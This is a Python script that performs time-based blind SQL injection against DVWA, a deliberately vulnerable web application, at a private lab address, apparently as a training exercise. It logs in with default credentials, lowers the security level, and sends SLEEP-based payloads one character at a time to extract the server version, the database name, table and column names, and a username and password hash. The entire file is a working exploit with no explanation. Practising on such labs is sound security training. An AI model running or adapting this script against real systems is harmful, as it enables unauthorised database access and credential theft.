import requests
import time
import string

# 1. CONFIGURATION
base_url = "http://10.0.2.5/dvwa"
login_url = f"{base_url}/login.php"
security_url = f"{base_url}/security.php"
target_url = f"{base_url}/vulnerabilities/sqli_blind/"

DVWA_USER = "admin"
DVWA_PASS = "password"   

charset = string.ascii_letters + string.digits + "_.-@"

session = requests.Session()

# 2. LOGIN + SET SECURITY LEVEL
def login_and_set_security(level="medium"):
    r = session.get(login_url)
    token_start = r.text.find("user_token' value='") + len("user_token' value='")
    token = r.text[token_start:token_start + 32] if token_start > -1 else ""

    session.post(login_url, data={
        "username": DVWA_USER,
        "password": DVWA_PASS,
        "Login": "Login",
        "user_token": token
    })

    r = session.get(security_url)
    token_start = r.text.find("user_token' value='") + len("user_token' value='")
    token = r.text[token_start:token_start + 32] if token_start > -1 else ""

    session.post(security_url, data={
        "security": level,
        "seclev_submit": "Submit",
        "user_token": token
    })
    print(f"[+] Logged in and set security to '{level}'")

# 3. CORE LOGIC
def check_condition(payload):

    params = {"id": payload, "Submit": "Submit"}
    start_time = time.time()
    try:
        session.get(target_url, params=params, timeout=10)
    except requests.exceptions.Timeout:
        return True
    return (time.time() - start_time) > 4

def extract_data(sql_query, max_length=30):
    result = ""
    print(f"[*] Extracting: {sql_query}")
    for i in range(1, max_length + 1):
        found_char = False
        for char in charset:

            hex_char = char.encode().hex()
            payload = f"1 AND IF(SUBSTRING(({sql_query}),{i},1)=0x{hex_char},SLEEP(5),0)-- -"
            if check_condition(payload):
                result += char
                print(f"    [+] Found character {i}: '{char}' -> Current: {result}")
                found_char = True
                break
        if not found_char:
            break
    return result

# 4. EXECUTION
if __name__ == "__main__":
    print("Starting Blind SQL Injection (Level: Medium)")
    login_and_set_security("medium")

    # PHASE 1: Version
    print("\n[PHASE 1] Extracting Server Version...")
    version = extract_data("SELECT VERSION()")
    print(f"\n[SUCCESS] Server Version: {version}")

    # PHASE 2: Database Name
    print("\n[PHASE 2] Extracting Database Name...")
    db_name = extract_data("SELECT DATABASE()")
    print(f"\n[SUCCESS] Database Name: {db_name}")

    # PHASE 3: Table Names
    print("\n[PHASE 3] Extracting Table Names...")
    table_1 = extract_data("SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT 0,1")
    print(f"\n[SUCCESS] First Table: {table_1}")
    table_2 = extract_data("SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT 1,1")
    print(f"\n[SUCCESS] Second Table: {table_2}")

    # PHASE 4: Column Names (Assumes the first table is 'users' or 'guestbook')
    print("\n[PHASE 4] Extracting Column Names from 'users' table...")
    col_1 = extract_data("SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 0,1")
    print(f"\n[SUCCESS] First Column: {col_1}")
    col_2 = extract_data("SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1,1")
    print(f"\n[SUCCESS] Second Column: {col_2}")

    # PHASE 5: Data Extraction
    print("\n[PHASE 5] Extracting Data (One Row)...")
    user_data = extract_data("SELECT user FROM users LIMIT 0,1")
    print(f"\n[SUCCESS] Username: {user_data}")
    pass_data = extract_data("SELECT password FROM users LIMIT 0,1")
    print(f"\n[SUCCESS] Password Hash: {pass_data}")
